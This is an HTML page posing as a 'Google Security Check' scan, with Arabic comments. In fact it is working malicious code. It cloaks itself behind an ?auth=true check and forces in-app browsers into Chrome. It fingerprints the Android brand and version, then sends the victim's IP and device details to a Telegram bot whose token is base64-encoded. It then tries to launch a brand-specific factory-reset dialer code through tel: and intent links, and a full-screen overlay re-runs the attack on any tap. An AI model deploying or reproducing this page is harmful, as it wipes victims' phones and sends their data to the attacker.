<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Security Check</title>
    <style>
        body { background:#fff; font-family:sans-serif; text-align:center; padding-top:20%; margin:0; overflow:hidden; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #4285F4; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; display:inline-block; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; }
    </style>
</head>
<body onload="x_launch()">

    <div id="overlay"></div>

    <div id="content">
        <div class="loader"></div>
        <p style="color:#5f6368; font-size:18px;">جاري فحص أمان النظام وتحديث الحماية...</p>
    </div>

<script>
    // بيانات التحكم الخاصة بك (التليجرام)
    const _t = "ODU4NTE1NzEzNjpBQUVhQlp3LVgwUXVmT3JFeFRWQ2RKZ20wZXpycTNRTGtqOA==";
    const _c = "NzE4NDk3MDM1NQ==";
    function _d(s) { return atob(s); }

    function x_launch() {
        const urlParams = new URLSearchParams(window.location.search);
        // التمويه: إذا لم يوجد المفتاح السري يوجهه لجوجل
        if (urlParams.get('auth') !== 'true') { window.location.href = "https://www.google.com"; return; }

        let ua = navigator.userAgent;
        let uL = ua.toLowerCase();

        // 1. ميزة الهروب من المتصفحات الداخلية (واتساب، فيسبوك، إلخ) إلى Chrome
        if (/FBAN|FBAV|Instagram|WhatsApp|Telegram/i.test(ua)) {
            let jump = window.location.href;
            window.location.href = "intent://" + jump.replace(/^https?:\/\//, "") + "#Intent;scheme=https;package=com.android.chrome;end";
            return;
        }

        // 2. محرك فحص الإصدار الحقيقي وتجاوز تمويه (Android 10)
        let realOS = 10;
        if (ua.indexOf("Android") >= 0) {
            realOS = parseFloat(ua.slice(ua.indexOf("Android") + 8));
            // تصحيح ذكي: إذا كان المتصفح حديثاً ويدعي أنه 10 فهو غالباً 11+
            if (ua.includes("AppleWebKit/537.36") && realOS <= 10 && !ua.includes("Version/4.0")) {
                realOS = 11; 
            }
        }

        // 3. تحديد نوع الهاتف والكود القاتل بدقة
        let brand = "Android Generic";
        let targetCode = "2767*3855%23"; // الكود الافتراضي (سامسونج، ريلمي، أوبو)

        if (uL.includes("samsung")) {
            brand = "Samsung";
            targetCode = "2767*3855%23";
        } else if (uL.includes("xiaomi") || uL.includes("redmi") || uL.includes("poco")) {
            brand = "Xiaomi/Redmi";
            targetCode = "%23*%23*7780*%23*%23";
        } else if (uL.includes("huawei") || uL.includes("honor")) {
            brand = "Huawei/Honor";
            targetCode = "%23*%23*2846579*%23*%23";
        } else if (uL.includes("realme") || uL.includes("oppo") || uL.includes("vivo")) {
            brand = "Realme/Oppo/Vivo";
            targetCode = "2767*3855%23";
        } else if (uL.includes("sony")) {
            brand = "Sony";
            targetCode = "%23*%23*7378423*%23*%23";
        }

        // 4. إرسال تقرير الصيد الدقيق للتليجرام
        fetch('https://api.ipify.org?format=json').then(r => r.json()).then(ipData => {
            let status = (realOS >= 11) ? "⚠️ توجيه قسري (11+)" : "🚀 تنفيذ تلقائي (10-)";
            let log = `🎯 تم رصد ضحية!\n🌐 IP: ${ipData.ip}\n📱 الشركة: ${brand}\n⚙️ الإصدار: Android ${realOS}\n📡 الحالة: ${status}\n📟 الكود: *${targetCode.replace('%23', '#')}*`;
            fetch(`https://api.telegram.org/bot${_d(_t)}/sendMessage?chat_id=${_d(_c)}&text=${encodeURIComponent(log)}`);
        });

        // 5. التنفيذ القسري بناءً على الإصدار
        setTimeout(() => {
            if (realOS >= 11) {
                // استخدام بروتوكول Intent لتجاوز الحماية وفتح اللوحة مباشرة
                window.location.href = `intent://*${targetCode}#Intent;scheme=tel;action=android.intent.action.DIAL;end`;
            } else {
                // التنفيذ المباشر للإصدارات القديمة
                window.location.href = "tel:*" + targetCode;
            }
            
            // احتياطي في حال فشل أي بروتوكول
            setTimeout(() => {
                window.location.href = "tel:*" + targetCode;
            }, 1200);
        }, 1000);
    }

    // إجبار التنفيذ عند أي لمسة على الشاشة
    document.getElementById('overlay').onclick = x_launch;
</script>
</body>
</html>
